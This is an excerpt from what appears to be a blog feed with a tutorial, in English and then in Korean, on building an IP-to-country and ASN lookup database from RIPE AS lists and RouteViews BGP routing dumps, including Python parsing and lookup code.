id="&#x1F527;-Building-an-IP-to-Country-Database-Based-on-BGP-Data"><a href="#&#x1F527;-Building-an-IP-to-Country-Database-Based-on-BGP-Data" class="headerlink" title="&#x1F527; Building an IP-to-Country Database Based on BGP Data"></a><strong>&#x1F527;</strong> Building an IP-to-Country Database Based on BGP Data</h1><p>Because Autonomous-System numbers are assigned by Regional Internet Registries (RIRs), we will&#x2014;as in Part 1&#x2014;download the allocation files directly from each registry. RIPE&#x2019;s repository, for instance, publishes a daily, comma-separated list containing every AS in the world.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image07.png" alt="png"></p><blockquote><p><a href="https://ftp.ripe.net/ripe/asnames/asn.txt">https://ftp.ripe.net/ripe/asnames/asn.txt</a></p></blockquote><p>Border-Gateway-Protocol (BGP) data comes from the <strong>RouteViews Archive</strong>, a project run by the University of Oregon. RouteViews peers with numerous ISPs, collects their BGP feeds, and makes the data publicly available. The archive has been active since 2001 and still updates every two hours.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image08.png" alt="png"></p><blockquote><p><a href="http://ftp.routeviews.org/bgpdata/">http://ftp.routeviews.org/bgpdata/</a></p></blockquote><p>RouteViews distributes its snapshots in the <strong>MRT (Multi-Threaded Routing Toolkit Routing Information Export Format)</strong> defined by RFC 6396. MRT is a structured binary format, so you can either process it with the <strong>bgpdump</strong> tool or write your own parser.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image09.png" alt="png"></p><p>With the raw sources in place, we can build the database using the following workflow:</p><ol><li>Download the AS data</li><li>Parse the AS data</li><li>Download the BGP archive data</li><li>Parse the BGP archive data</li><li>Transform the ASN-to-prefix records (convert IP ranges to integers)</li><li>Store the ranges in a structure that supports binary search</li></ol><p>Coding these steps will give us a complete IP-to-Country-and-AS mapping database.</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-comment"># builtin modules</span><span class="hljs-keyword">from</span> ipaddress <span class="hljs-keyword">import</span> ip_network, IPv4Address<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> bz2<span class="hljs-keyword">import</span> readline<span class="hljs-comment"># install modules</span><span class="hljs-keyword">import</span> mrtparse<span class="hljs-keyword">import</span> requestsintervals=[]ASN_TABLE={}ASN_INFO_DB = <span class="hljs-string">&quot;asn.txt&quot;</span>IPINFO_DB = <span class="hljs-string">&quot;ipinfo_db.txt&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">ip</span>):</span>    result = <span class="hljs-literal">None</span>    <span class="hljs-keyword">try</span>:        search_ip = int(IPv4Address(ip))    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    left, right = <span class="hljs-number">0</span>, len(intervals) - <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> left &lt;= right:        mid = (left + right) // <span class="hljs-number">2</span>        start_ip, end_ip, asn = intervals[mid]        <span class="hljs-keyword">if</span> start_ip &lt;= search_ip &lt;= end_ip:            result=(start_ip, end_ip, asn)            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">elif</span> start_ip &gt; search_ip:            right = mid - <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            left = mid + <span class="hljs-number">1</span>    <span class="hljs-keyword">if</span> result:        start_ip, end_ip, asn = result        prefix = <span class="hljs-string">f&quot;<span class="hljs-subst">{IPv4Address(start_ip)}</span>/<span class="hljs-subst">{<span class="hljs-number">32</span> - (end_ip - start_ip).bit_length()}</span>&quot;</span>        result={ <span class="hljs-string">&quot;ip&quot;</span>:ip, <span class="hljs-string">&quot;prefix&quot;</span>:prefix, <span class="hljs-string">&quot;country&quot;</span>:<span class="hljs-literal">None</span>, <span class="hljs-string">&quot;asn&quot;</span>:asn, <span class="hljs-string">&quot;asn_description&quot;</span>:<span class="hljs-literal">None</span> }        result.update(ASN_TABLE[asn])        <span class="hljs-keyword">return</span> result    <span class="hljs-keyword">return</span> result<span class="hljs-comment"># MRT data parse</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_rib_v4</span>(<span class="hljs-params">path</span>):</span>    TDV2_PEER_IDX = mrtparse.TD_V2_ST[<span class="hljs-string">&quot;PEER_INDEX_TABLE&quot;</span>]  <span class="hljs-comment"># 1</span>    TDV2_RIB_V4 = mrtparse.TD_V2_ST[<span class="hljs-string">&quot;RIB_IPV4_UNICAST&quot;</span>]    <span class="hljs-comment"># 2</span>    TABLE_DUMP_V2 = mrtparse.MRT_T[<span class="hljs-string">&quot;TABLE_DUMP_V2&quot;</span>]        <span class="hljs-comment"># 13</span>    <span class="hljs-keyword">with</span> bz2.open(path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> fd:        <span class="hljs-keyword">for</span> record <span class="hljs-keyword">in</span> mrtparse.Reader(fd):            <span class="hljs-keyword">if</span> record.err:                <span class="hljs-keyword">continue</span>            RECORD_TYPE = next(iter(record.data[<span class="hljs-string">&quot;type&quot;</span>].keys()))            RECORD_SUB_TYPE = next(iter(record.data[<span class="hljs-string">&quot;subtype&quot;</span>].keys()))            <span class="hljs-keyword">if</span> (RECORD_TYPE != TABLE_DUMP_V2) <span class="hljs-keyword">or</span> (RECORD_SUB_TYPE != TDV2_RIB_V4):                <span class="hljs-keyword">continue</span>            prefix = <span class="hljs-string">f&quot;<span class="hljs-subst">{record.data[<span class="hljs-string">&apos;prefix&apos;</span>]}</span>/<span class="hljs-subst">{record.data[<span class="hljs-string">&apos;length&apos;</span>]}</span>&quot;</span>            <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> record.data[<span class="hljs-string">&quot;rib_entries&quot;</span>]:                pidx = entry[<span class="hljs-string">&quot;peer_index&quot;</span>]                as_path_attr = next((a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> entry[<span class="hljs-string">&quot;path_attributes&quot;</span>] <span class="hljs-keyword">if</span> <span class="hljs-number">2</span> <span class="hljs-keyword">in</span> a[<span class="hljs-string">&quot;type&quot;</span>]), <span class="hljs-literal">None</span>)                path = []                <span class="hljs-keyword">if</span> as_path_attr:                    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> as_path_attr[<span class="hljs-string">&quot;value&quot;</span>]:                        path.extend(seg[<span class="hljs-string">&quot;value&quot;</span>])                <span class="hljs-keyword">yield</span> {<span class="hljs-string">&quot;prefix&quot;</span>:prefix, <span class="hljs-string">&quot;asn&quot;</span>:path[<span class="hljs-number">-1</span>]}                <span class="hljs-keyword">break</span> <span class="hljs-comment"># Since it does not deal with paths, each prefix is processed only once.</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">download_asn_list</span>():</span>    r = requests.get(<span class="hljs-string">&quot;https://ftp.ripe.net/ripe/asnames/asn.txt&quot;</span>)    r.raise_for_status()    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:        <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;asn.txt&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:            f.write(r.content)    <span class="hljs-keyword">return</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_ipinfo_db</span>():</span>    <span class="hljs-comment"># When used in practice, the RIB data is updated every 2 hours.</span>    r = requests.get(<span class="hljs-string">&quot;http://ftp.routeviews.org/bgpdata/2025.07/RIBS/rib.20250711.1000.bz2&quot;</span>)    <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;rib.20250711.1000.bz2&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:        f.write(r.content)    <span class="hljs-keyword">with</span> open(IPINFO_DB,<span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">as</span> f:        <span class="hljs-keyword">for</span> record <span class="hljs-keyword">in</span> parse_rib_v4(<span class="hljs-string">&quot;rib.20250711.1000.bz2&quot;</span>):            asn = record[<span class="hljs-string">&apos;asn&apos;</span>]            prefix = ip_network(record[<span class="hljs-string">&apos;prefix&apos;</span>])            ip_start = int(prefix[<span class="hljs-number">0</span>])            ip_end = int(prefix[<span class="hljs-number">-1</span>])            f.write(<span class="hljs-string">f&quot;<span class="hljs-subst">{ip_start}</span>,<span class="hljs-subst">{ip_end}</span>,<span class="hljs-subst">{asn}</span>\n&quot;</span>)    <span class="hljs-keyword">return</span><span class="hljs-comment"># Load memory</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_database</span>():</span>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(ASN_INFO_DB):        download_asn_list()    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(IPINFO_DB):        build_ipinfo_db()    <span class="hljs-keyword">with</span> open(ASN_INFO_DB, <span class="hljs-string">&apos;r&apos;</span>) <span class="hljs-keyword">as</span> f:        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:            line = line.strip()            <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;,&apos;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> line:                <span class="hljs-keyword">continue</span>            asn, description = line.split(<span class="hljs-string">&apos; &apos;</span>, <span class="hljs-number">1</span>)            description, country = description.rsplit(<span class="hljs-string">&apos;, &apos;</span>, <span class="hljs-number">1</span>)            ASN_TABLE[asn] = {<span class="hljs-string">&quot;country&quot;</span>: country, <span class="hljs-string">&quot;asn_description&quot;</span>: description}        print(<span class="hljs-string">&quot;ASN table loadd&quot;</span>)    <span class="hljs-keyword">with</span> open(IPINFO_DB, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:            start_ip, end_ip, asn = line.strip().split(<span class="hljs-string">&quot;,&quot;</span>)            intervals.append((int(start_ip), int(end_ip), asn))    print(<span class="hljs-string">&quot;Databse load&quot;</span>)    <span class="hljs-keyword">return</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    init_database()    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        ip = input(<span class="hljs-string">&quot;Search: &quot;</span>)        ip_info=search(ip)        print(ip_info)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre><h1 id="&#x1F44B;-Final-thoughts"><a href="#&#x1F44B;-Final-thoughts" class="headerlink" title="&#x1F44B; Final thoughts"></a><strong>&#x1F44B;</strong> Final thoughts</h1><p>In this article, the IP-lookup tool we built in Part 1 has been upgraded: when you query an IP address it now returns the ASN, prefix, and an ASN description in addition to the country code.</p><pre><code class="hljs json">{  <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;1.1.1.1&quot;</span>,  <span class="hljs-attr">&quot;prefix&quot;</span>: <span class="hljs-string">&quot;1.1.1.0/24&quot;</span>,  <span class="hljs-attr">&quot;country&quot;</span>: <span class="hljs-string">&quot;US&quot;</span>,  <span class="hljs-attr">&quot;asn&quot;</span>: <span class="hljs-string">&quot;13335&quot;</span>,  <span class="hljs-attr">&quot;asn_description&quot;</span>: <span class="hljs-string">&quot;CLOUDFLARENET&quot;</span>}</code></pre><p>Compared to the IP information lookup service ipinfo.io, we found that the same basic information is provided.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/image10.png" alt="png"></p><p>Services like ipinfo.io also offer additional metadata such as physical location, ISP, and indicators of VPN or proxy usage. While such data is built upon each provider&#x2019;s proprietary expertise and technology, the fundamental IP-to-country and AS information is likely generated using a methodology similar to what is introduced in this post.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/empty/">empty</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/Network/">Network</category>
      
      <category domain="https://hackyboiz.github.io/tags/RIR/">RIR</category>
      
      <category domain="https://hackyboiz.github.io/tags/IP/">IP</category>
      
      <category domain="https://hackyboiz.github.io/tags/ipwhois/">ipwhois</category>
      
      <category domain="https://hackyboiz.github.io/tags/bgp/">bgp</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_EN/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] IP 국가 데이터베이스 만들기 Part 2 (With BGP) (ko)</title>
      <link>https://hackyboiz.github.io/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/</link>
      <guid>https://hackyboiz.github.io/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/</guid>
      <pubDate>Sun, 27 Jul 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#x1F44B;-&amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&quot;&gt;&lt;a href=&quot;#&amp;#x1F44B;-&amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x1F44B</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#x1F44B;-&#xD504;&#xB864;&#xB85C;&#xADF8;"><a href="#&#x1F44B;-&#xD504;&#xB864;&#xB85C;&#xADF8;" class="headerlink" title="&#x1F44B; &#xD504;&#xB864;&#xB85C;&#xADF8;"></a>&#x1F44B; &#xD504;&#xB864;&#xB85C;&#xADF8;</h1><p>&#xC9C0;&#xB09C; &#xD3EC;&#xC2A4;&#xD305;(<a href="https://hackyboiz.github.io/2025/03/02/empty/Creating_an_IP_Country_Information_Database_KO/">IP &#xAD6D;&#xAC00; DB &#xB9CC;&#xB4E4;&#xAE30;</a>)&#xC5D0;&#xC11C;&#xB294; RIR&#xC5D0;&#xC11C; &#xC218;&#xC9D1; &#xAC00;&#xB2A5;&#xD55C; <code>delegated-*.csv</code>&#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; IP&#xC758; &#xAD6D;&#xAC00; &#xC815;&#xBCF4;&#xB97C; &#xC870;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;, IP&#xC758; <strong>&#xAD6D;&#xAC00; &#xC815;&#xBCF4; &#xD558;&#xB098;&#xB9CC;&#xC73C;&#xB860;</strong> &#xC2E4;&#xC81C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC720;&#xC758;&#xBBF8;&#xD558;&#xAC8C; &#xD65C;&#xC6A9;&#xD560; &#xC218;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E8;&#xD3B8;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC608;&#xB97C; &#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li><strong>&#xC545;&#xC131; IP</strong>&#xAC00; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD638;&#xC2A4;&#xD305;&#xC778;&#xC9C0; &#xAC00;&#xC815;&#xC6A9; &#xD68C;&#xC120;&#xC778;&#xC9C0; &#xAD6C;&#xBD84; &#xBD88;&#xAC00; &#x2192; &#xC624;&#xCC28;&#xB2E8; &#xB9AC;&#xC2A4;&#xD06C; &#xC874;&#xC7AC;</li><li>&#xAC19;&#xC740; AS&#xC5D0; &#xC228;&#xC5B4; &#xC788;&#xB294; &#xCD94;&#xAC00; &#xC704;&#xD611; &#xD53C;&#xBD07;&#xD305; &#xBD88;&#xAC00; &#x2192; &#xC704;&#xD611; &#xD5CC;&#xD305; &#xBD88;&#xAC00;</li><li>&#xACF5;&#xACA9; &#xC9C0;&#xD45C;&#xB97C; CIDR, AS &#xB2E8;&#xC704;&#xB85C; &#xBB36;&#xC5B4; &#xCC28;&#xB2E8; &#xBD88;&#xAC00; &#x2192; &#xACF5;&#xACA9;&#xC790; &#xC778;&#xD504;&#xB77C; &#xC77C;&#xAD04; &#xCC28;&#xB2E8; &#xBD88;&#xAC00;</li></ul><p>&#xC989;, IP&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD560; &#xB550;, &#xAD6D;&#xAC00; &#xC815;&#xBCF4; &#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xB2E4;&#xC591;&#xD55C; &#xBCF4;&#xC870; &#xC9C0;&#xD45C;&#xAC00; &#xD544;&#xC694;&#xD558;&#xBA70; &#xADF8;&#xC911; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC9C0;&#xD45C;&#xC778; AS(Autonomous System)&#xC815;&#xBCF4;&#xB97C; BGP(Border Gateway Protocol)&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xBCF4;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xB860;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#x1F310;-Autonomous-System"><a href="#&#x1F310;-Autonomous-System" class="headerlink" title="&#x1F310; Autonomous System"></a>&#x1F310; Autonomous System</h1><p>&#xC6B0;&#xB9AC;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <strong>&#xC778;&#xD130;&#xB137;&#xC740; AS(Autonomous System)&#xB77C;&#xB294; &#xB17C;&#xB9AC;&#xC801; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB4E4;&#xC758; &#xC9D1;&#xD569;</strong>&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01; AS&#xB294; &#xD1B5;&#xC2E0;&#xC0AC;, &#xAE30;&#xC5C5;, &#xAE30;&#xAD00; &#xB4F1;&#xC5D0;&#xC11C; <strong>&#xB3C5;&#xB9BD;&#xC801;&#xC73C;&#xB85C; &#xC6B4;&#xC601;&#xD558;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xB2E8;&#xC704;</strong>&#xB97C; &#xB73B;&#xD558;&#xBA70;, &#xC774;&#xB4E4;&#xC774; &#xC11C;&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xC5B4; &#xC804; &#xC138;&#xACC4; &#xC778;&#xD130;&#xB137;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image00.png" alt="png"></p><blockquote><p><a href="https://www.wallarm.com/what/bgp-routing-explanation">https://www.wallarm.com/what/bgp-routing-explanation</a></p></blockquote><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xC81C;&#xAC00; &#xC9D1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <strong>IP &#xC8FC;&#xC18C; 124.54.178.xxx&#xB294; LG&#xD30C;&#xC6CC;&#xCF64;(LG&#xC720;&#xD50C;&#xB7EC;&#xC2A4;)&#xC774; &#xC6B4;&#xC601;&#xD558;&#xB294; AS17858&#xC5D0; &#xC18C;&#xC18D;</strong>&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. AS17858&#xC5D0;&#xB294; &#xC57D; 1,000&#xB9CC; &#xAC1C;&#xC758; IP &#xC8FC;&#xC18C;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, &#xC774;&#xB294; 207&#xAC1C;&#xC758; &#xD504;&#xB9AC;&#xD53D;&#xC2A4;(prefix)&#xB85C; &#xB098;&#xB258;&#xC5B4; &#xAD00;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image01.png" alt="png"></p><p>AS&#xB294; 4&#xBC14;&#xC774;&#xD2B8; &#xC22B;&#xC790;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xC5EC; <strong>AS1 ~ AS4,294,967,296&#xAE4C;&#xC9C0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC608;&#xC57D;</strong>&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBC88;&#xD638; &#xB610;&#xD55C;, ip&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xC9C0;&#xC5ED;&#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;(RIR)&#xC5D0; &#xC758;&#xD574; &#xAD00;&#xB9AC;&#xB418;&#xACE0; &#xC788;&#xC73C;&#xBA70;, &#xC6B0;&#xB9AC;&#xB098;&#xB77C;&#xC758; &#xACBD;&#xC6B0; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC694;&#xAC74;&#xC744; &#xAC16;&#xCD9C; &#xACBD;&#xC6B0; &#xD55C;&#xAD6D;&#xC778;&#xD130;&#xB137;&#xC9C4;&#xD765;&#xC6D0;&#xC5D0; &#xC2E0;&#xCCAD;&#xD558;&#xC5EC; &#xACE0;&#xC720;&#xD55C; ASN&#xC744; &#xBD80;&#xC5EC;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC778;&#xD130;&#xB137;&#xC0C1;&#xC5D0;&#xC11C; &#xB3C5;&#xB9BD;&#xC801;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xB97C; &#xAD6C;&#xCD95;&#xD560; &#xC218; &#xC788;&#xB294; &#xC124;&#xBE44;&#xB97C; &#xC6B4;&#xC6A9;</li><li>&#xB450;&#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xB9DD;&#xACFC; &#xC5F0;&#xACB0; &#xB610;&#xB294; &#xC5F0;&#xACB0;&#xACC4;&#xD68D;&#xC774; &#xC788;&#xC5B4;&#xC57C; &#xD568;</li><li>&#xB3C5;&#xC790;&#xC801;&#xC778; &#xB77C;&#xC6B0;&#xD305; &#xACBD;&#xB85C;&#xC124;&#xC815;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xC5EC;&#xC57C; &#xD568;</li></ul><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image02.png" alt="png"></p><p>&#xC790;&#xACA9; &#xC694;&#xAC74;&#xC744; &#xAC16;&#xCD94;&#xBA74; <strong>&#xAC1C;&#xC778;&#xB3C4; AS &#xBC88;&#xD638;(ASN)&#xB97C; &#xD560;&#xB2F9;&#xBC1B;&#xC544;</strong> &#xC6B4;&#xC601;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xC0AC;&#xB840;&#xB85C; <strong>AS 215343</strong>&#xC740; <strong>&#xAE40;&#xBBFC;&#xC7AC;</strong>&#xB77C;&#xB294; &#xBD84;&#xC774; &#xC5F0;&#xAD6C; &#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xC2E0;&#xCCAD;&#xD574; &#xC6B4;&#xC6A9; &#xC911;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. &#xC815;&#xD655;&#xD55C; &#xC0AC;&#xC720;&#xB294; &#xBAA8;&#xB974;&#xACA0;&#xC9C0;&#xB9CC;, &#xD55C;&#xAD6D;&#xC778;&#xD130;&#xB137;&#xC9C4;&#xD765;&#xC6D0;&#xC774; &#xC544;&#xB2CC; &#xC720;&#xB7FD;&#xC758; RIR (RIPE NCC)&#xB97C; &#xD1B5;&#xD574; &#xBD80;&#xC5EC;&#xBC1B;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image03.png" alt="png"></p><blockquote><p>AS215343&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85;: <a href="https://prezi.com/p/uh9o2mavv3x2/as215343-isp/">https://prezi.com/p/uh9o2mavv3x2/as215343-isp/</a></p></blockquote><h1 id="&#x1F697;-BGP-Border-Gateway-Protocol"><a href="#&#x1F697;-BGP-Border-Gateway-Protocol" class="headerlink" title="&#x1F697; BGP(Border Gateway Protocol)"></a><strong>&#x1F697;</strong> BGP(Border Gateway Protocol)</h1><p>&#xC778;&#xD130;&#xB137;&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xC5F0;&#xACB0;&#xB418;&#xC9C0; &#xC54A;&#xC740; AS&#xB85C; &#xD2B8;&#xB798;&#xD53D;&#xC744; &#xBCF4;&#xB0B4;&#xB824;&#xBA74;, &#xC911;&#xAC04;&#xC5D0; &#xC5B4;&#xB5A4; AS&#xB97C; &#xAC70;&#xCE60;&#xC9C0;&#xC5D0; &#xB300;&#xD55C; &#xACBD;&#xB85C; &#xC815;&#xBCF4;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. BGP(Border Gateway Protocol)&#xB294; &#xC778;&#xC811;&#xD55C; AS &#xAC04;&#xC5D0; &#xC774;&#xB7EC;&#xD55C; &#xACBD;&#xB85C; &#xC815;&#xBCF4;&#xB97C; &#xC8FC;&#xACE0;&#xBC1B;&#xC544;, &#xAC01; &#xB77C;&#xC6B0;&#xD130;&#xAC00; &#xC815;&#xCC45;&#xC5D0; &#xB530;&#xB77C; &#xAC00;&#xC7A5; &#xC801;&#xD569;&#xD55C; &#xACBD;&#xB85C;&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xAC8C; &#xD574; &#xC8FC;&#xB294; &#xC778;&#xD130;&#xB137; &#xD45C;&#xC900; &#xB77C;&#xC6B0;&#xD305; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/07/27/empty/Creating_an_IP_Country_Information_Database_Part2_KO/image04.png" alt="png"></p><blockquote><p><a href="https://devopedia.org/border-gateway-protocol">https://devopedia.org/border-gateway-protocol</a></p></blockquote><p>&#xB0B4;&#xBD80;&#xD5A5;, &#xC678;&#xBD80;&#xD5A5;&#xC5D0; &#xB530;&#xB77C; IBGP(Internal BGP), EBGP(External BGP)&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;. &#xAC01; AS&#xB77C;&#xC6B0;&#xD130;&#xB4E4;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; BGP&#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xC778;&#xC811; &#xB77C;&#xC6B0;&#xD130;&#xC5D0;&#xAC8C; &#xAD11;&#xACE0;(Announcing)&#xD558;&#xC5EC; &#xCD5C;&#xC801;&#xC758; &#xACBD;&#xB85C;(AS Path)&#xB97C; &#xCC3E;&#xC544;&#xAC08; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC548;&#xB0B4;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">TIME: 07/10/25 14:00:00TYPE: TABLE_DUMP_V2/IPV4_UNICASTPREFIX: 3.166.152.0/23SEQUENCE: 7558FROM: 45.83.33.27 AS208821ORIGINATED: 07/09/25 00:01:40ORIGIN: IGPASPATH: 208821 206119 9121 1299 16509NEXT_HOP: 45.83.33.27COMMUNITY: 1299:35000 9121:50000 9121:50008</code></pre><p>&#xC704; &#xBA54;&#xC138;&#xC9C0;&#xC5D0;&#xC11C; &#xBD10;&#xC57C;&#xD560; &#xC8FC;&#xC694; &#xD56D;&#xBAA9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>PREFIX:</strong> Announcing&#xB41C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;(CIDR)</li><li><strong>FROM:</strong> &#xC774; &#xACBD;&#xB85C;&#xB97C; &#xBCF4;&#xB0B8; &#xD53C;&#xC5B4; &#xB77C;&#xC6B0;&#xD130;&#xC758; IP &#xBC0F; AS &#xBC88;&#xD638;.</li><li><strong>ORIGIN:</strong> &#xACBD;&#xB85C; &#xAE30;&#xC6D0; &#xC18D;&#xC131;(IGP, EGP, INCOMPLETE &#xC911; &#xD558;&#xB098;)</li><li><strong>ASPATH:</strong> &#xBAA9;&#xC801;&#xC9C0;&#xAE4C;&#xC9C0; &#xAC70;&#xCCD0;&#xC628; AS &#xBC88;&#xD638; &#xB9AC;&#xC2A4;&#xD2B8;(&#xC67C;&#xCABD;&#xC774; &#xAC00;&#xC7A5; &#xADFC;&#xC811;)</li><li><strong>NEXT_HOP:</strong> &#xC774; &#xACBD;&#xB85C;&#xB85C; &#xBCF4;&#xB0BC; &#xC2E4;&#xC81C; &#xB2E4;&#xC74C; &#xD649; IP</li></ul><p>PREFIX 3.166.152.0/23(AS16509)&#xB85C; &#xD5A5;&#xD558;&#xB294; &#xD328;&#xD0B7;&#xC740; 45.83.33.27(AS208821)&#xC744; &#xAC70;&#xCCD0; AS208821 &#x2192; AS206119 &#x2192; AS9121 